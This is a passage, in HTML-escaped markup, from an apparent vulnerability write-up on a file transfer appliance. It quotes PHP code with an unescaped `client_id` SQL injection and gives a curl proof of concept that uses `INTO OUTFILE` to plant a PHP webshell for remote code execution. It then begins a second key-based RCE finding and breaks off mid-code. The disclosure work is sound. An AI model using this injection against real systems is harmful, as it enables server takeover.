&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.* FROM t_mail_server &apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysql_escape_like&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_type&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_status&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fatal_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;exec:mysql_query(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;) respond:&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id  != \&apos;999\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;!(t_mail_server.c_flag &amp;amp; &apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;CLIENT_DELETED&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_server_id = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_manager = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_name LIKE \&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%%&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_user_id LIKE \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The parameters passed onto the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt;  will be assembled into SQL statements. Among all the functions joining the assembling, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; is the most crucial one.&lt;br /&gt;
In the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt;, every parameter is protected by the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_real_escape_string&lt;/code&gt; except for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt;. Judging from the coding style of the source code, it might be a result of oversight. Therefore, SQL Injection can be triggered by sending out corresponding parameters according to the program flow.&lt;/p&gt;

&lt;p&gt;In addition, FTA database user has root privileges with FILE_PRIV option enabled. By exploiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INTO OUTFILE&lt;/code&gt; and writing their own PHP code to write-enabled directory, user will be able to execute code remotely!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://&amp;lt;fta&amp;gt;/courier/1000@/security_key2.api &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;aid=1000&amp;amp;user_id=1&amp;amp;password=1&amp;amp;client_id=&apos; OR 1=1 LIMIT 1 INTO OUTFILE &apos;/home/seos/courier/themes/templates/.cc.php&apos; LINES TERMINATED BY 0x3c3f...#&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The created PHP file will be located at&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://&amp;lt;fta&amp;gt;/courier/themes/templates/.cc.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;known-secret-key-leads-to-remote-code-execution&quot;&gt;Known-Secret-Key leads to Remote Code Execution&lt;/h4&gt;

&lt;p&gt;In the previous vulnerability, one requirement to execute code remotely is the existence of a write-enabled directory for injecting webshell. But in reality, chances are there is no write-enabled directory available, thus fail to execute code through SQL Injection. But there is another way to help us accomplish RCE.&lt;/p&gt;

&lt;p&gt;The precondition of this vulnerability is &lt;strong&gt;Known-Secret-Key stored in the database&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is not a problem, since the database can be accessed with the SQL Injection vulnerability mentioned earlier. Also, although there are some parameter filters in the code, they can be bypassed!&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;fc&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/(.+)\(.*\)/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_session_cache&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_user_contact&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;valid_password&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_update_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_format_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_email_verified&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_exist_allow_direct_download&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_profile_auth&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
